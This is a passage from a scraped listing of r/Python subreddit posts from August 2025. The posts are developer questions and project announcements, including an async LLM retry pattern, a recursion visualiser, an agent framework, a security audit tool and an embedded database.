Check for the signing gesture and then check which tag was closest and if it‚Äòs in the maximum distance. 

This prototype will be used to demonstrate the technology. It doesn‚Äôt have to be up to industrial norms etc. 

Does anyone have experience with BLE tags? I know of minew and blueup, but haven‚Äôt tried them yet. 
"
1mk1vc7,Where do enterprises run analytic python code?,tylerriccio8,107,94,2025-08-07 14:39:52,https://www.reddit.com/r/Python/comments/1mk1vc7/where_do_enterprises_run_analytic_python_code/,"I work at a regional bank. We have zero python infrastructure; as in data scientists and analysts will download and install python on their local machine and run the code there.

There‚Äôs no limiting/tooling consistency, no environment expectations or dependency management and it‚Äôs all run locally on shitty hardware.

I‚Äôm wondering what largeish enterprises tend to do. Perhaps a common server to ssh into? Local analysis but a common toolset? Any anecdotes would be valuable :)

EDIT: see chase runs their own stack called Athena which is pretty interesting. Basically eks with Jupyter notebooks attached to it"
1mk0zr9,Python implementation: Making unreliable AI APIs reliable with asyncio and PostgreSQL,Historical_Wing_9573,1,5,2025-08-07 14:04:48,https://www.reddit.com/r/Python/comments/1mk0zr9/python_implementation_making_unreliable_ai_apis/,"**Python Challenge:** Your `await openai.chat.completions.create()` randomly fails with 429 errors. Your batch jobs crash halfway through. Users get nothing.

**My Solution:** Apply async patterns + database persistence. Treat LLM APIs like any unreliable third-party service.

**Transactional Outbox Pattern in Python:**

1. **Accept request ‚Üí Save to DB ‚Üí Return immediately**

&#8203;

    @app.post(""/process"")
    async def create_job(request: JobRequest, db: AsyncSession):
        job = JobExecution(status=""pending"", payload=request.dict())
        db.add(job)
        await db.commit()
        return {""job_id"": job.id}  
    # 200 OK immediately

1. **Background asyncio worker with retries**

&#8203;

    async def process_pending_jobs():
        while True:
            jobs = await get_pending_jobs(db)
            for job in jobs:
                if await try_acquire_lock(job):
                    asyncio.create_task(process_with_retries(job))
            await asyncio.sleep(1)

1. **Retry logic with tenacity**

&#8203;

    from tenacity import retry, wait_exponential, stop_after_attempt
    
    @retry(wait=wait_exponential(min=4, max=60), stop=stop_after_attempt(5))
    async def call_llm_with_retries(prompt: str):
        async with httpx.AsyncClient() as client:
            response = await client.post(""https://api.deepseek.com/..."", json={...})
            response.raise_for_status()
            return response.json()

**Production Results:**

* 99.5% job completion (vs. 80% with direct API calls)
* Migrated OpenAI ‚Üí DeepSeek: $20 dev costs ‚Üí $0 production
* Horizontal scaling with multiple asyncio workers
* Proper error handling and observability

**Stack:** FastAPI, SQLAlchemy, PostgreSQL, asyncio, tenacity, httpx

**Full implementation:** [https://github.com/vitalii-honchar/reddit-agent](https://github.com/vitalii-honchar/reddit-agent)  
**Technical writeup:** [https://vitaliihonchar.com/insights/designing-ai-applications-principles-of-distributed-systems](https://vitaliihonchar.com/insights/designing-ai-applications-principles-of-distributed-systems)

Stop fighting AI reliability with AI tools. Use Python's async capabilities."
1mk0psk,Easily Visualize Recursive Function Calls in the Console,secularchapel,17,0,2025-08-07 13:53:48,https://www.reddit.com/r/Python/comments/1mk0psk/easily_visualize_recursive_function_calls_in_the/,"Hi everyone!

I‚Äôm excited to share a¬†[small library I wrote](https://github.com/cabralpinto/trevis)¬†that lets you¬†**visualize recursive function calls directly in the console**, which I‚Äôve found super helpful for debugging and understanding recursion.

**What My Project Does**

Here‚Äôs a quick example:

    from trevis import recursion
    
    @recursion
    def fib(n: int) -> int:
        if n < 2: return n
        return fib(n - 1) + fib(n - 2)
    
    fib(4)

And the output:

    fib(4) ‚Üí 3
    ‚îú‚ï¥fib(3) ‚Üí 2
    ‚îÇ ‚îú‚ï¥fib(2) ‚Üí 1
    ‚îÇ ‚îÇ ‚îú‚ï¥fib(1) ‚Üí 1
    ‚îÇ ‚îÇ ‚îî‚ï¥fib(0) ‚Üí 0
    ‚îÇ ‚îî‚ï¥fib(1) ‚Üí 1
    ‚îî‚ï¥fib(2) ‚Üí 1
      ‚îú‚ï¥fib(1) ‚Üí 1
      ‚îî‚ï¥fib(0) ‚Üí 0

There's also an¬†**interactive mode**¬†where you can press Enter to step through each call, which I've also found super handy for debugging or just understanding how recursion unfolds.

**Target Audience**

People debugging or learning recursive functions.

**Comparison**

Other related projects like [recursion-visualiser](https://pypi.org/project/recursion-visualiser/) and [recursion-tree-visualizer](https://github.com/brpapa/recursion-tree-visualizer) rely on graphical interfaces and require more setup, which may be inconvenient when you are only trying to debug and iterate on your code.

Would love your feedback, ideas, or bug reports. Thanks! üòä"
1mjw40b,What python based game engine would you recommend?,Da1stGenshinImpacter,38,39,2025-08-07 10:08:24,https://www.reddit.com/r/Python/comments/1mjw40b/what_python_based_game_engine_would_you_recommend/,"For some background info, I have been using python for school since 2024 but i'm still kinda grasping some aspects of it. For my school project, I have decided to create a video game. For context, the game is supposed to have a story aspect at first, but then after the story is completed, it is more free play. Like the player gets to walk around and interact with the world. I plan on having these world interactions being either connected to a crafting system or combat system. Currently I'm torn between using either pygame or pyglet. 

Any advice on which engine I should use? Or any recommendations on a completely different game engine to use? 

Just looking for some opinions!"
1mjw1y0,Bytecode for multiple Python versions,Ok-Adeptness4586,11,9,2025-08-07 10:05:02,https://www.reddit.com/r/Python/comments/1mjw1y0/bytecode_for_multiple_python_versions/,"Hi all,

I would like to be able to generate the bytecode (pyc) for a given source file containing the source code for a class (let's call it Foo). I then have another source file containing the code for a second class (Foo2) that inherits from the first one (Foo).

By doing so, I can distribute the sources of the second class (Foo2) along with the bytecode of the first class (Foo). In this way the user won't have access to the code in Foo and still have access to some of the methods (overloaded) in the Foo2 class.

I do this for teaching some stuff. The goal would be that I can distribute the class Foo2 containing the prototypes of the methods that I want students to implement. Additionally the can very easily compare their results with those generated with the method of the parent class. The advantages of this is that I can hide some methods that might not be relevant for teaching purposes (reading, writing, plotting, etc) making the code easier to understand for students.

The problem is that I would have to generate the bytecode of Foo for many different python versions, so I was wondering if someone has a clever way generating those?

Do you have a better alternative to this?

You have a dummy example of a code here :

[https://godbolt.org/z/WdcWsvo4c](https://godbolt.org/z/WdcWsvo4c)"
1mjkyyw,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,3,0,2025-08-07 00:00:32,https://www.reddit.com/r/Python/comments/1mjkyyw/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1mjanx3,Using AI to convert Perl Power Tools to Python,briandfoy,3,3,2025-08-06 17:17:02,https://www.reddit.com/r/Python/comments/1mjanx3/using_ai_to_convert_perl_power_tools_to_python/,"I maintain a project called [Perl Power Tools](https://github.com/briandfoy/PerlPowerTools) which was originally started in 1999 by [Tom Christiansen](https://en.wikipedia.org/wiki/Tom_Christiansen) to provide Windows the tools that Unix people expect. Although it's 26 years later, I'm still maintaining the project mostly because it's not that demanding and it's fun.

Now, Jeffery S. Haemerhas started the [Python Power Tools project](https://github.com/jsh/PythonPowerTools) to automatically port those to Python. I don't have any part of that, but I'm interested in how it will work out and what won't translate well. Some of this is really old 1990s style Perl and is bad style today, especially with decades of Perl slowly improving."
1mj5atd,I finish my first app with Python/Kivy,nyveros_,25,3,2025-08-06 13:53:54,https://www.reddit.com/r/Python/comments/1mj5atd/i_finish_my_first_app_with_pythonkivy/,"Hi everyone!
I just finished developing Minimal-Lyst, a lightweight music player built using Python and Kivy.

It supports .mp3, .ogg, and .wav files, has a clean interface, and allows users to customize themes by swapping image assets.

I'd love to hear your thoughts, feedback, or suggestions for improvement!

GitHub repo:
https://github.com/PGFerraz/Minimal-Lyst-Music-PLayer"
1miw2jm,Pybotchi: Lightweight Intent-Based Agent Builder,madolid511,2,5,2025-08-06 05:18:02,https://www.reddit.com/r/Python/comments/1miw2jm/pybotchi_lightweight_intentbased_agent_builder/,"## Core Architecture:

**Nested Intent-Based Supervisor Agent Architecture**

## What Core Features Are Currently Supported?

### Lifecycle

- Every agent utilizes pre, core, fallback, and post executions.

### Sequential Combination

- Multiple agent executions can be performed in sequence within a single tool call.

### Concurrent Combination

- Multiple agent executions can be performed concurrently in a single tool call, using either threads or tasks.

### Sequential Iteration

- Multiple agent executions can be performed via iteration.

### MCP Integration

- **As Server**: Existing agents can be mounted to FastAPI to become an MCP endpoint.
- **As Client**: Agents can connect to an MCP server and integrate its tools.
  - Tools can be overridden.

### Combine/Override/Extend/Nest Everything

- Everything is configurable.

## How to Declare an Agent?

### LLM Declaration

```python
from pybotchi import LLM
from langchain_openai import ChatOpenAI

LLM.add(
    base = ChatOpenAI(.....)
)
```

### Imports

```
from pybotchi import Action, ActionReturn, Context
```

### Agent Declaration

```python
class Translation(Action):
    """"""Translate to specified language.""""""

    async def pre(self, context):
        message = await context.llm.ainvoke(context.prompts)
        await context.add_response(self, message.content)
        return ActionReturn.GO
```

- This can already work as an agent. `context.llm` will use the base LLM.
- You have complete freedom here: call another agent, invoke LLM frameworks, execute tools, perform mathematical operations, call external APIs, or save to a database. There are no restrictions.

### Agent Declaration with Fields

```python
class MathProblem(Action):
    """"""Solve math problems.""""""

    answer: str

    async def pre(self, context):
        await context.add_response(self, self.answer)
        return ActionReturn.GO
```

- Since this agent requires arguments, you need to attach it to a parent `Action` to use it as an agent. Don't worry, it doesn't need to have anything specific; just add it as a child `Action`, and it should work fine.
- You can use `pydantic.Field` to add descriptions of the fields if needed.

### Multi-Agent Declaration

```python
class MultiAgent(Action):
    """"""Solve math problems, translate to specific language, or both.""""""

    class SolveMath(MathProblem):
        pass

    class Translate(Translation):
        pass
```

- This is already your multi-agent. You can use it as is or extend it further.
- You can still override it: change the docstring, override pre-execution, or add post-execution. There are no restrictions.

### How to Run?

```python
import asyncio

async def test():
    context = Context(
        prompts=[
            {""role"": ""system"", ""content"": ""You're an AI that can solve math problems and translate any request. You can call both if necessary.""},
            {""role"": ""user"", ""content"": ""4 x 4 and explain your answer in filipino""}
        ],
    )
    action, result = await context.start(MultiAgent)
    print(context.prompts[-1][""content""])
asyncio.run(test())
```

### Result

Ang sagot sa 4 x 4 ay 16.

Paliwanag: Ang ibig sabihin ng ""4 x 4"" ay apat na grupo ng apat. Kung bibilangin natin ito: 4 + 4 + 4 + 4 = 16. Kaya, ang sagot ay 16.

### How Pybotchi Improves Our Development and Maintainability, and How It Might Help Others Too

Since our agents are now modular, each agent will have isolated development. Agents can be maintained by different developers, teams, departments, organizations, or even communities.

**Every agent can have its own abstraction that won't affect others. You might imagine an agent maintained by a community that you import and attach to your own agent. You can customize it in case you need to patch some part of it.**

**Enterprise services can develop their own translation layer, similar to MCP, but without requiring MCP server/client complexity.**

---

### Other Examples

- **Don't forget LLM declaration!**

#### MCP Integration (as Server)

```python
from contextlib import AsyncExitStack, asynccontextmanager
from fastapi import FastAPI
from pybotchi import Action, ActionReturn, start_mcp_servers

class TranslateToEnglish(Action):
    """"""Translate sentence to english.""""""

    __mcp_groups__ = [""your_endpoint""]

    sentence: str

    async def pre(self, context):
        message = await context.llm.ainvoke(
            f""Translate this to english: {self.sentence}""
        )
        await context.add_response(self, message.content)
        return ActionReturn.GO


@asynccontextmanager
async def lifespan(app):
    """"""Override life cycle.""""""
    async with AsyncExitStack() as stack:
        await start_mcp_servers(app, stack)
        yield


app = FastAPI(lifespan=lifespan)
```

```bash
from asyncio import run

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

async def main():
    async with streamablehttp_client(
        ""http://localhost:8000/your_endpoint/mcp"",
    ) as (
        read_stream,
        write_stream,
        _,
    ):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            tools = await session.list_tools()
            response = await session.call_tool(
                ""TranslateToEnglish"",
                arguments={
                    ""sentence"": ""Kamusta?"",
                },
            )
            print(f""Available tools: {[tool.name for tool in tools.tools]}"")
            print(response.content[0].text)

run(main())
```

#### Result

```
Available tools: ['TranslateToEnglish']
""Kamusta?"" in English is ""How are you?""
```

#### MCP Integration (as Client)

```python
from asyncio import run

from pybotchi import (
    ActionReturn,
    Context,
    MCPAction,
    MCPConnection,
    graph,
)


class GeneralChat(MCPAction):
    """"""Casual Generic Chat.""""""

    __mcp_connections__ = [
        MCPConnection(
            ""YourAdditionalIdentifier"",
            ""http://0.0.0.0:8000/your_endpoint/mcp"",
            require_integration=False,
        )
    ]


async def test() -> None:
    """"""Chat.""""""
    context = Context(
        prompts=[
            {""role"": ""system"", ""content"": """"},
            {""role"": ""user"", ""content"": ""What is the english of `Kamusta?`""},
        ]
    )
    await context.start(GeneralChat)
    print(context.prompts[-1][""content""])
    print(await graph(GeneralChat))


run(test())
```

#### Result (_Response and Mermaid flowchart_)

```
""Kamusta?"" in English is ""How are you?""
flowchart TD
mcp.YourAdditionalIdentifier.Translatetoenglish[mcp.YourAdditionalIdentifier.Translatetoenglish]
__main__.GeneralChat[__main__.GeneralChat]
__main__.GeneralChat --> mcp.YourAdditionalIdentifier.Translatetoenglish
```

- You may add post execution to adjust the final response if needed

#### Iteration

```python
class MultiAgent(Action):
    """"""Solve math problems, translate to specific language, or both.""""""

    __max_child_iteration__ = 5

    class SolveMath(MathProblem):
        pass

    class Translate(Translation):
        pass
```

- This will allow iteration approach similar to other framework

#### Concurrent and Post-Execution Utilization

```python
class GeneralChat(Action):
    """"""Casual Generic Chat.""""""

    class Joke(Action):
        """"""This Assistant is used when user's inquiry is related to generating a joke.""""""

        __concurrent__ = True

        async def pre(self, context):
            print(""Executing Joke..."")
            message = await context.llm.ainvoke(""generate very short joke"")
            context.add_usage(self, context.llm, message.usage_metadata)

            await context.add_response(self, message.content)
            print(""Done executing Joke..."")
            return ActionReturn.GO

    class StoryTelling(Action):
        """"""This Assistant is used when user's inquiry is related to generating stories.""""""

        __concurrent__ = True

        async def pre(self, context):
            print(""Executing StoryTelling..."")
            message = await context.llm.ainvoke(""generate a very short story"")
            context.add_usage(self, context.llm, message.usage_metadata)

            await context.add_response(self, message.content)
            print(""Done executing StoryTelling..."")
            return ActionReturn.GO

    async def post(self, context):
        print(""Executing post..."")
        message = await context.llm.ainvoke(context.prompts)
        await context.add_message(ChatRole.ASSISTANT, message.content)
        print(""Done executing post..."")
        return ActionReturn.END

async def test() -> None:
    """"""Chat.""""""
    context = Context(
        prompts=[
            {""role"": ""system"", ""content"": """"},
            {
                ""role"": ""user"",
                ""content"": ""Tell me a joke and incorporate it on a very short story"",
            },
        ],
    )
    await context.start(GeneralChat)
    print(context.prompts[-1][""content""])

run(test())
```

#### Result

```
Executing Joke...
Executing StoryTelling...
Done executing Joke...
Done executing StoryTelling...
Executing post...
Done executing post...
Here‚Äôs a very short story with a joke built in:

Every morning, Mia took the shortcut to school by walking along the two white chalk lines her teacher had drawn for a math lesson. She said the lines were ‚Äúparallel‚Äù and explained, ‚ÄúParallel lines have so much in common; it‚Äôs a shame they‚Äôll never meet.‚Äù Every day, Mia wondered if maybe, just maybe, she could make them cross‚Äîuntil she realized, with a smile, that like some friends, it‚Äôs fun to walk side by side even if your paths don‚Äôt always intersect!
```

#### Complex Overrides and Nesting

```python
class Override(MultiAgent):
    SolveMath = None  # Remove action

    class NewAction(Action):  # Add new action
        pass

    class Translation(Translate):  # Override existing
        async def pre(self, context):
            # override pre execution

        class ChildAction(Action): # Add new action in existing Translate

            class GrandChildAction(Action):
                # Nest if needed
                # Declaring it outside this class is recommend as it's more maintainable
                # You can use it as base class
                pass

    # MultiAgent might already overrided the Solvemath.
    # In that case, you can use it also as base class
    class SolveMath2(MultiAgent.SolveMath):
        # Do other override here
        pass
```

#### Manage prompts / Call different framework

```python
class YourAction(Action):
    """"""Description of your action.""""""


    async def pre(self, context):
        # manipulate
        prompts = [{
            ""content"": ""hello"",
            ""role"": ""user""
        }]
        # prompts = itertools.islice(context.prompts, 5)
        # prompts = [
        #    *context.prompts,
        #    {
        #        ""content"": ""hello"",
        #        ""role"": ""user""
        #    },
        # ]
        # prompts = [
        #    *some_generator_prompts(),
        #    *itertools.islice(context.prompts, 3)
        # ]

        # default using langchain
        message = await context.llm.ainvoke(prompts)
        content = message.content

        # other langchain library
        message = await custom_base_chat_model.ainvoke(prompts)
        content = message.content

        # Langgraph
        APP = your_graph.compile()
        message = await APP.ainvoke(prompts)
        content = message[""messages""][-1].content

        # CrewAI
        content = await crew.kickoff_async(inputs=your_customized_prompts)


        await context.add_response(self, content)
```

#### Overidding Tool Selection

```python
class YourAction(Action):
    """"""Description of your action.""""""


    class Action1(Action):
        pass
    class Action2(Action):
        pass
    class Action3(Action):
        pass

    # this will always select Action1
    async def child_selection(
        self,
        context: Context,
        child_actions: ChildActions | None = None,
    ) -> tuple[list[""Action""], str]:
        """"""Execute tool selection process.""""""

        # Getting child_actions manually
        child_actions = await self.get_child_actions(context)

        # Do your process here

        return [self.Action1()], ""Your fallback message here incase nothing is selected""
```

## Repository Examples

### **Basic**

- [`tiny.py`](https://github.com/amadolid/pybotchi/blob/master/examples/tiny.py) - Minimal implementation to get you started
- [`full_spec.py`](https://github.com/amadolid/pybotchi/blob/master/examples/full_spec.py) - Complete feature demonstration

### **Flow Control**

- [`sequential_combination.py`](https://github.com/amadolid/pybotchi/blob/master/examples/sequential_combination.py) - Multiple actions in sequence
- [`sequential_iteration.py`](https://github.com/amadolid/pybotchi/blob/master/examples/sequential_iteration.py) - Iterative action execution
- [`nested_combination.py`](https://github.com/amadolid/pybotchi/blob/master/examples/nested_combination.py) - Complex nested structures

### **Concurrency**

- [`concurrent_combination.py`](https://github.com/amadolid/pybotchi/blob/master/examples/concurrent_combination.py) - Parallel action execution
- [`concurrent_threading_combination.py`](https://github.com/amadolid/pybotchi/blob/master/examples/concurrent_threading_combination.py) - Multi-threaded processing

### **Real-World Applications**

- [`interactive_agent.py`](https://github.com/amadolid/pybotchi/blob/master/examples/interactive_agent.py) - Real-time WebSocket communication
- [`jira_agent.py`](https://github.com/amadolid/pybotchi/blob/master/examples/jira_agent.py) - Integration with MCP Atlassian server
- [`agent_with_mcp.py`](https://github.com/amadolid/pybotchi/blob/master/examples/agent_with_mcp.py) - Hosting Actions as MCP tools

### **Framework Comparison (Get Weather)**

- [`Pybotchi`](https://github.com/amadolid/pybotchi/blob/master/examples/vs/action_approach.py)
- [`LangGraph`](https://github.com/amadolid/pybotchi/blob/master/examples/vs/langgraph_approach.py)

Feel free to comment or message me for examples. I hope this helps with your development too.

https://github.com/amadolid/pybotchi
"
1miuohk,"*Noobie* Created my first ""app"" today!",zArijz,121,22,2025-08-06 04:01:22,https://www.reddit.com/r/Python/comments/1miuohk/noobie_created_my_first_app_today/,"Recently got into coding (around a month or so ago) and python was something I remembered from a class I took in high school. Through rehashing my memory on YouTube and other forums, today I built my first ""app"" I guess? Its a checker for minecraft usernames that connects to the mojang api and allows you to see if usernames are available or not. Working on adding a text file import, but for now its manual typing / paste with one username per line.

Pretty proud of my work and how far I've come in a short time. Can't add an image (I'm guessing cuz I just joined the sub) but here's an imgur of how it looks! Basic I know, but functional! I know some of guys are probably pros and slate me for how it looks but I'm so proud of it lol. Here's to going further!

[Image of what I made](https://imgur.com/a/KmRXbdp)"
1miha0y,Encapsulation Isn‚Äôt Java‚Äôs Fault (And Python Needs It Too),Last_Difference9410,0,24,2025-08-05 18:32:20,https://www.reddit.com/r/Python/comments/1miha0y/encapsulation_isnt_javas_fault_and_python_needs/,"Encapsulation in Python is one of those topics that often gets brushed off, either as unnecessary boilerplate or as baggage from statically typed languages like Java and C++. In many Python teams, it‚Äôs treated as optional, or worse, irrelevant.

But this casual attitude has a cost.

As Python takes on a bigger role in enterprise software, especially with the rise of AI, more teams are building larger, more complex systems together. Without proper encapsulation, internal changes in one part of the codebase can leak out and break things for everyone else. It becomes harder to reason about code boundaries, harder to collaborate, and harder to move fast without stepping on each other‚Äôs toes.

In this post, we‚Äôll talk about¬†**the reason encapsulation still matters in Python,** the trends of it becoming increasingly important, and haw we approach it in a way that actually fits the language and its philosophy.

And just in case you‚Äôre curious:¬†**no, this won‚Äôt be one of those ""here‚Äôs Haw to mimic Java‚Äôs access modifiers in Python"" posts.**¬†We're going deeper than that.

\--- 

Blog:

[lihil blogs - Encapsulation Isn‚Äôt Java‚Äôs Fault (And Python Needs It Too)](https://www.lihil.cc/blog/encapsulation-isnt-javas-fault-and-python-needs-it-too)

‚Äî-

There is a big difference between not having encapsulation enforced by the interpreter and NOT HAVING ENCAPSULATION AT ALL

This post is saying that 

‚ÄúWE NEED ENCAPSULATION IN PYTHON‚Äù

NOT
NOT 
NOT
NOT WE NEED ACCESS MODIFIER ENFORCED BY PYTHON INTERPRETER

"
1mid7mt,Optional chaining operator in Python,FabianVeAl,13,24,2025-08-05 16:03:55,https://www.reddit.com/r/Python/comments/1mid7mt/optional_chaining_operator_in_python/,"I'm trying to implement the optional chaining operator (`?.`) from JS in Python. The idea of this implementation is to create an Optional class that wraps a type T and allows getting attributes. When getting an attribute from the wrapped object, the type of result should be the type of the attribute or None. For example:

    ## 1. None
    my_obj = Optional(None)
    result = (
        my_obj # Optional[None]
        .attr1 # Optional[None]
        .attr2 # Optional[None]
        .attr3 # Optional[None] 
        .value # None
    ) # None
    
    ## 2. Nested Objects
    
    @dataclass
    class A:
        attr3: int
    
    @dataclass
    class B:
        attr2: A
    
    @dataclass
    class C:
        attr1: B
    
    my_obj = Optional(C(B(A(1))))
    result = (
        my_obj # # Optional[C]
        .attr1 # Optional[B | None]
        .attr2 # Optional[A | None]
        .attr3 # Optional[int | None]
        .value # int | None
    ) # 5
    
    ## 3. Nested with None values
    @dataclass
    class X:
        attr1: int
    
    @dataclass
    class Y:
        attr2: X | None
    
    @dataclass
    class Z:
        attr1: Y
    
    my_obj = Optional(Z(Y(None)))
    result = (
        my_obj # Optional[Z]
        .attr1 # Optional[Y | None]
        .attr2 # Optional[X | None]
        .attr3 # Optional[None]
        .value # None
    ) # None

My first implementation is:

    from dataclasses import dataclass
    
    @dataclass
    class Optional[T]:
        value: T | None
    
        def __getattr__[V](self, name: str) -> ""Optional[V | None]"":
            return Optional(getattr(self.value, name, None))

But Pyright and Ty don't recognize the subtypes. What would be the best way to implement this?"
1mid59i,Python Code Audit - A modern Python source code analyzer based on distrust.,FastRunningMike,4,0,2025-08-05 16:01:34,https://www.reddit.com/r/Python/comments/1mid59i/python_code_audit_a_modern_python_source_code/,"**What My Project Does**

Python Codeaudit is a tool to find security issues in Python code. This static application security testing (SAST) tool has great features to simplify the necessary security tasks and make it fun and easy.

  
**Key Features**

* **Vulnerability Detection**: Identifies security vulnerabilities in Python files, essential for package security research.
* **Complexity & Statistics**: Reports security-relevant complexity using a fast, lightweight [cyclomatic complexity](https://en.wikipedia.org/wiki/Cyclomatic_complexity) count via Python's AST.
* **Module Usage & External Vulnerabilities**: Detects used modules and reports vulnerabilities in external ones.
* **Inline Issue Reporting**: Shows potential security issues with line numbers and code snippets.
* **HTML Reports**: All output is saved in simple, static HTML reports viewable in any browser.

**Target Audience**

* Anyone who want or must check security risks with Python programs.
* Anyone who loves to create functionality using Python. So not only professional programs , but also occasional Python programmers or programmers who are used to working with other languages.
* Anyone who wants an easy way to get insight in possible security risks Python programs.

**Comparison**

There are not many good and maintained FOSS SAST tools for Python available. A well known Python SAST tool is `Bandit`. However `Bandit` is limited in identifying security issues and has constrains that makes the use not simple. `Bandit` lacks crucial Python code validations from a security perspective!

  
**Goal**

Make Impact! I believe:

* Cyber security protection can be better and
* Cyber security solutions can be simpler.
* We should only use cyber security solutions that are transparent, and we can trust.

Openness is key. Join the community to contribute to this , local first , Python Security Audit scanner. Join the journey!

 **GitHub Repo**: [https://github.com/nocomplexity/codeaudit](https://github.com/nocomplexity/codeaudit)

On pip: [https://pypi.org/project/codeaudit/](https://pypi.org/project/codeaudit/) 

"
1mib8l9,Neurocipher: Python project combining cryptography and Hopfield networks,davidgc17,8,2,2025-08-05 14:47:55,https://www.reddit.com/r/Python/comments/1mib8l9/neurocipher_python_project_combining_cryptography/,"**What My Project Does**

Neurocipher is a Python-based research project that integrates classic cryptography with neural networks. It goes beyond standard encryption examples by implementing both encryption algorithms and associative memory for key recovery using Hopfield networks.

**Key Features**

Manual implementation of symmetric (AES/Fernet) and asymmetric (RSA, ECC/ECDSA) encryption.

Fully documented math foundations and code explanations in LaTeX (PDF included).

A Hopfield neural network capable of storing and recovering binary keys (e.g., 128-bit) with up to 40‚Äì50% noise.

Recovery experiments automated and visualized in Python (CSV + Matplotlib).

All tests reproducible, with logging, version control and clean structure.

**Target Audience**

This project is ideal for:

Python developers interested in cryptography internals.

Students or educators looking for educational crypto demos.

ML researchers exploring neural associative memory.

Anyone curious about building crypto + memory systems from scratch.

**How It Stands Out**

While most crypto projects focus only on encryption/decryption, Neurocipher explores how corrupted or noisy keys could be recovered, bridging the gap between cryptography and biologically-inspired computation.

This is not just a toy project ‚Äî it‚Äôs a testbed for secure, noise-resilient memory.

**Get Started**

* git clone [https://github.com/davidgc17/neurocipher](https://github.com/davidgc17/neurocipher) 
* cd neurocipher 
* pip install -r requirements.txt 
* python demos/demo\_symmetric.py 

View full documentation, experiments and diagrams in /docs and /graficos.

üîó **GitHub Repo**: [github.com/davidgc17/neurocipher](http://github.com/davidgc17/neurocipher) üìÑ License: Apache 2.0 üöÄ Release: v1.0 now available!

Open to feedback, ideas, or collaboration. Let me know what you think, and feel free to explore or contribute!"
1miaw6m,"Axiom, a new kind of ""truth engine"" as a tool to fight my own schizophrenia. Now open-sourcing it.",sexyvic623,529,316,2025-08-05 14:34:54,https://www.reddit.com/r/Python/comments/1miaw6m/axiom_a_new_kind_of_truth_engine_as_a_tool_to/,"Schizophrenia was the diagnosis I was given 20+ years ago and since then have recovered. I am one of the few people diagnosed who was weened off medication and now lives a healthy life. these posts i make (less than 10 total posts) should not dictate or determine the state of my health.

what im presenting is a new idea

that has been and is constantly being attacked maybe because i called LLMs stupid by design or what have you but regardless i am being attacked for sharing an idea


so without furthur distractions!

I made something great and an sharing it. end of story! 

take care and God Bless!
REPO found here
[repo](https://github.com/vicsanity623/Axiom-Agent.git)"
1mi4l6o,Started Working on a FOSS Alternative to Tableau and Power BI 45 Days Ago,naruaika,29,13,2025-08-05 09:31:57,https://www.reddit.com/r/Python/comments/1mi4l6o/started_working_on_a_foss_alternative_to_tableau/,"It might take another 5-10 years to find the right fit to meet the community's needs. It's not a thing today. But we should be able to launch the first alpha version later this year. The initial idea was too broad and ambitious. But do you have any wild imaginations as to what advanced features would be worth including?

What My Project Does

On the initial stage of the development, I'm trying to mimic the basic functionality of Tableau and Power BI. As well as a subset from Microsoft Excel. On the next stage, we can expect it'll support node editor to manage data pipeline like Alteryx Designer.

Target Audience

It's for production, yes. The original idea was to enable my co-worker at office to load more than 1 million rows of text file (CSV or similar) on a laptop and manually process it using some formulas (think of a spreadsheet app). But the real goal is to provide a new professional alternative for BI, especially on GNU/Linux ecosystem, since I'm a Linux desktop user, a Pandas user as well.

Comparison

I've conducted research on these apps:

- Microsoft Excel
- Google Sheets
- Power BI
- Tableau
- Alteryx Designer
- SmoothCSV

But I have no intention whatsoever to compete with all of them. For a little more information, I'm planning to make it possible to code with Python to process the data within the app. Well, this eventually will make the project more impossible to develop.

Here's the link to the repository: https://github.com/naruaika/eruo-data-studio

P.S. I'm currently still working on another big commit which will support creating a new table column using DAX-like syntax. It's already possible to generate a new column using a subset of SQL syntax, thanks to the SQL interface by the Polars library."
1mi0jjw,Built Coffy: an embedded database engine for Python (Graph + NoSQL),neel3sh,64,5,2025-08-05 05:16:53,https://www.reddit.com/r/Python/comments/1mi0jjw/built_coffy_an_embedded_database_engine_for/,"I got tired of the overhead:

* Setting up full Neo4j instances for tiny graph experiments
* Jumping between libraries for SQL, NoSQL, and graph data
* Wrestling with heavy frameworks just to run a simple script

So, I built Coffy. (https://github.com/nsarathy/coffy)

Coffy is an embedded database engine for Python that supports NoSQL, SQL, and Graph data models. One Python library, that comes with:

* NoSQL (coffy.nosql) - Store and query JSON documents locally with a chainable API. Filter, aggregate, and join data without setting up MongoDB or any server.
* Graph (coffy.graph) -  Build and traverse graphs. Query nodes and relationships, and match patterns. No servers, no setup.
* SQL (coffy.sql) - Thin SQLite wrapper. Available if you need it.

What Coffy won't do: Run a billion-user app or handle distributed workloads.

What Coffy will do:

* Make local prototyping feel effortless again.
* Eliminate setup friction - no servers, no drivers, no environment juggling.

Coffy is open source, lean, and developer-first.

Curious?

Install Coffy: [https://pypi.org/project/coffy/](https://pypi.org/project/coffy/)

Or let's make it even better!

[https://github.com/nsarathy/coffy](https://github.com/nsarathy/coffy)

  
**### What My Project Does**  
Coffy is an embedded Python database engine combining SQL, NoSQL, and Graph in one library for quick local prototyping.

**### Target Audience**  
Developers who want fast, serverless data experiments without production-scale complexity.

**### Comparison**  
Unlike full-fledged databases, Coffy is lightweight, zero-setup, and built for scripts and rapid iteration."
